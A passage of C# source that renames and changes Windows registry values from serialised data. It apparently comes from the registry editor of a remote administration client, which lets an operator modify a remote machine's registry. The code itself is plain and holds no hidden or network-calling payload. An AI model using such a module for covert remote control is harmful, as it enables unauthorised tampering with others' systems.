                    errorMsg = "The value: " + oldName + " does not exist in: " + keyPath;
                    return false;
                }

                bool success = key.RenameValueSafe(oldName, newName);

                //Value could not be renamed
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_RENAME_ERROR;
                    return false;
                }

                //Value was successfully renamed
                errorMsg = "";
                return true;

            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        /// <summary>
        /// Attempts to change the value for the desired registry value for the 
        /// specified key.
        /// </summary>
        /// <param name="value">The registry value to change to in the form of a
        /// RegValueData object.</param>
        /// <param name="keyPath">The path to the key for which to change the 
        /// value of the registry value on.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        public static bool ChangeRegistryValue(RegValueData value, string keyPath, out string errorMsg)
        {
            try
            {
                byte[] byteRewrited = null;
                var serializer = new JavaScriptSerializer();
                bool success;

                RegistryKey key = GetWritableRegistryKey(keyPath);

                //Invalid can not open key
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    return false;
                }

                //Is not default value and does not exist
                if (!RegistryKeyHelper.IsDefaultValue(value.Name) && !key.ContainsValue(value.Name))
                {
                    errorMsg = "The value: " + value.Name + " does not exist in: " + keyPath;
                    return false;
                }

                if(value.Kind == RegistryValueKind.Binary)
                {
                    var result = serializer.DeserializeObject(value.Data);
                    object[] convertToObjectArray = (Object[])result;
                    byteRewrited = new byte[convertToObjectArray.Length];
                    int i = 0;
                    foreach (object obj in convertToObjectArray)
                    {
                        byteRewrited[i] = byte.Parse(obj.ToString());
                        i++;
                    }
                     success = key.SetValueSafe(value.Name, byteRewrited, value.Kind);
                }
                else if (value.Kind == RegistryValueKind.String || value.Kind == RegistryValueKind.ExpandString)
                {
                    success = key.SetValueSafe(value.Name, value.Data, value.Kind);
                }
                else if (value.Kind == RegistryValueKind.DWord)
                {
                    success = key.SetValueSafe(value.Name, value.Data, value.Kind);
                }
                else if (value.Kind == RegistryValueKind.MultiString)
                {
                    var result = serializer.DeserializeObject(value.Data);
                    object[] convertToObjectArray = (Object[])result;
                    string[] strArr = new string[convertToObjectArray.Length];
                    int i = 0;
                    foreach (object obj in convertToObjectArray)
                    {
                        strArr[i] = obj.ToString();
                        i++;
                    }
                    success = key.SetValueSafe(value.Name, strArr, value.Kind);
                }
                else
                {
                    var result = serializer.DeserializeObject(value.Data);
                    success = key.SetValueSafe(value.Name, result, value.Kind);
                }


                //Value could not be created
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_CHANGE_ERROR;
                    return false;
                }

                //Value was successfully created
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }

        }

        #endregion

        public static RegistryKey GetWritableRegistryKey(string keyPath)
        {
            RegistryKey key = RegistrySeeker.GetRootKey(keyPath);

            if (key != null)
            {
                //Check if this is a root key or not
                if (key.Name != keyPath)
                {
                    //Must get the subKey name by removing root and '\\'
                    string subKeyName = keyPath.Substring(key.Name.Length + 1);

                    key = key.OpenWritableSubKeySafe(subKeyName);
                }
            }

            return key;
        }
    }
}
